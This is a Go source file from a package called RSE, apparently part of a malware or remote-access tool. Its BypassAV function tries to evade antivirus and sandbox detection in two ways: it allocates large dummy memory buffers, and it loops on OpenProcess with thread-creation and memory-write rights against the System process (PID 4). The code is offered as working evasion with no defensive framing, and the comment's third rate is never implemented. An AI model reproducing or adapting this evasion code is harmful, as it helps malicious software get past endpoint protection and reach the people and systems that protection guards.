package RSE

func BypassAV(Rate int) { // Rate 1 - 3
  if Rate == 1 {
    AllocateFakeMemory()
  }else if Rate == 2 {
    AllocateFakeMemory()
    GoBig()
  }
}

func AllocateFakeMemory()  {
  var Size int = 30000000
  Buffer_1 := make([]byte, Size)
  Buffer_1[0] = 1
  var Buffer_2 [102400000]byte
  Buffer_2[0] = 0
}

func GoBig()  {
  for ;; {
    PID := 4
    Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(0), uintptr(PID))
    if Proc != 0 {
      break
    }
  }
}
